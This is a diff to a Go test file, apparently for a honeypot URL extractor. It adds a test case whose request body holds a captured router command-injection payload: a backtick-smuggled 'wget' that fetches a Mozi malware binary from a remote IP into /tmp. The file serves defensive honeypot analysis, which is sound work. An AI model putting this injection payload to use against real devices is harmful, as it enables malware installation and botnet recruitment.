@@ -158,6 +158,16 @@ func TestURLExtractor(t *testing.T) {
 			},
 		},
 		{
+			description: "Find URL in body (no encoding header)",
+			urlsToFind:  []string{"http://115.55.237.117:51813/Mozi.m"},
+			request: database.Request{
+				Uri:        "/ignored?aa=bb",
+				Raw:        "ssadsa",
+				Body:       []byte("XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://115.55.237.117:51813/Mozi.m+-O+->/tmp/gpon80"),
+				HoneypotIP: "1.1.1.1",
+			},
+		},
+		{
 			description: "Find URL in body (encoded)",
 			urlsToFind:  []string{"http://192.210.162.147/arm7"},
 			request: database.Request{
